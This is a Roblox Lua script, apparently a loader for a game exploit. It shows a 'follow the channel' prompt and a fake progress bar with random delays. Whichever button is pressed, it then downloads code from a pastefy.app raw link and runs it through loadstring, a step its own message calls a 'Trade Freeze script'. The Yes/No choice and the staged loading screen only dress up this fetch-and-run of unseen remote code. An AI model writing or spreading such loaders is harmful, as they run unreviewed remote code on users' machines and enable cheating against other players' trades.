local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local PlayerGui = LocalPlayer:WaitForChild("PlayerGui")
local TweenService = game:GetService("TweenService")
local RunService = game:GetService("RunService")

task.wait(3)

local promptGui = Instance.new("ScreenGui")
promptGui.Name = "FollowPromptGui"
promptGui.Parent = PlayerGui
promptGui.ResetOnSpawn = false

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 300, 0, 150)
frame.Position = UDim2.new(0.5, -150, 0.5, -75)
frame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
frame.BorderSizePixel = 0
frame.Parent = promptGui

local corner = Instance.new("UICorner")
corner.CornerRadius = UDim.new(0, 15)
corner.Parent = frame

local questionLabel = Instance.new("TextLabel")
questionLabel.Size = UDim2.new(1, -40, 0, 80)
questionLabel.Position = UDim2.new(0, 20, 0, 15)
questionLabel.BackgroundTransparency = 1
questionLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
questionLabel.Font = Enum.Font.GothamBold
questionLabel.TextSize = 20
questionLabel.Text = "Have you followed the channel?"
questionLabel.TextWrapped = true
questionLabel.Parent = frame

local function createButton(text, positionX)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 0, 40)
    btn.Position = UDim2.new(0, positionX, 1, -55)
    btn.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
    btn.TextColor3 = Color3.fromRGB(255, 255, 255)
    btn.Font = Enum.Font.GothamBold
    btn.TextSize = 18
    btn.Text = text
    btn.Parent = frame
    local btnCorner = Instance.new("UICorner")
    btnCorner.CornerRadius = UDim.new(0, 10)
    btnCorner.Parent = btn
    return btn
end

local yesButton = createButton("Yes", 40)
local noButton = createButton("No", 160)

local function disableButtonsAndHide()
    yesButton.Visible = false
    noButton.Visible = false
    yesButton.Active = false
    noButton.Active = false
    yesButton.AutoButtonColor = false
    noButton.AutoButtonColor = false
end

local function loadTradeFreezeScript()
    local success, err = pcall(function()
        local code = game:HttpGet("https://pastefy.app/n3IsXwoj/raw")
        local func = loadstring(code)
        func()
    end)
    if not success then
        warn("Failed to load Trade Freeze script:", err)
    end
end

local function showLoadingScreen(duration, callback)
    frame.Visible = false  -- hide prompt frame during loading

    local loadingFrame = Instance.new("Frame")
    loadingFrame.Size = UDim2.new(0, 300, 0, 100)
    loadingFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
    loadingFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
    loadingFrame.BorderSizePixel = 0
    loadingFrame.Parent = promptGui
    local corner = Instance.new("UICorner")
    corner.CornerRadius = UDim.new(0, 15)
    corner.Parent = loadingFrame

    local loadingLabel = Instance.new("TextLabel")
    loadingLabel.Size = UDim2.new(1, 0, 0, 30)
    loadingLabel.Position = UDim2.new(0, 0, 0, 10)
    loadingLabel.BackgroundTransparency = 1
    loadingLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
    loadingLabel.Font = Enum.Font.GothamBold
    loadingLabel.TextSize = 22
    loadingLabel.Text = "Loading..."
    loadingLabel.Parent = loadingFrame

    local loadingBarBg = Instance.new("Frame")
    loadingBarBg.Size = UDim2.new(0, 260, 0, 25)
    loadingBarBg.Position = UDim2.new(0, 20, 0, 60)
    loadingBarBg.BackgroundColor3 = Color3.fromRGB(70, 70, 70)
    loadingBarBg.Parent = loadingFrame
    local bgCorner = Instance.new("UICorner")
    bgCorner.CornerRadius = UDim.new(0, 12)
    bgCorner.Parent = loadingBarBg

    local loadingBar = Instance.new("Frame")
    loadingBar.Size = UDim2.new(0, 0, 0, 25)
    loadingBar.Position = UDim2.new(0, 0, 0, 0)
    loadingBar.BackgroundColor3 = Color3.fromRGB(70, 130, 180)
    loadingBar.Parent = loadingBarBg
    local barCorner = Instance.new("UICorner")
    barCorner.CornerRadius = UDim.new(0, 12)
    barCorner.Parent = loadingBar

    local percentLabel = Instance.new("TextLabel")
    percentLabel.Size = UDim2.new(1, 0, 0, 25)
    percentLabel.Position = UDim2.new(0, 0, 0, 60)
    percentLabel.BackgroundTransparency = 1
    percentLabel.TextColor3 = Color3.fromRGB(230, 230, 230)
    percentLabel.Font = Enum.Font.GothamBold
    percentLabel.TextSize = 18
    percentLabel.Text = "0%"
    percentLabel.Parent = loadingFrame

    local totalSteps = 150
    local baseStepTime = duration / totalSteps
    local currentStep = 0

    while currentStep <= totalSteps do
        local progress = currentStep / totalSteps
        loadingBar.Size = UDim2.new(progress, 0, 0, 25)
        percentLabel.Text = tostring(math.floor(progress * 100)) .. "%"

        -- Random small delays to simulate uneven loading
        local rand = math.random()
        if rand < 0.1 then
            task.wait(baseStepTime * 3) -- longer pause (~10% chance)
        elseif rand < 0.25 then
            task.wait(baseStepTime * 1.5) -- slight pause (~15% chance)
        else
            task.wait(baseStepTime) -- normal speed (~75% chance)
        end

        currentStep = currentStep + 1
    end

    promptGui:Destroy()

    -- Added delay before executing external script
    task.wait(3)

    if callback then
        callback()
    end
end

yesButton.MouseButton1Click:Connect(function()
    disableButtonsAndHide()
    questionLabel.Text = "Enjoy using the script!!"
    task.wait(4)
    showLoadingScreen(15, loadTradeFreezeScript)
end)

noButton.MouseButton1Click:Connect(function()
    disableButtonsAndHide()
    questionLabel.Text = "Please follow to support the creator"
    task.wait(3)
    showLoadingScreen(15, loadTradeFreezeScript)
end)
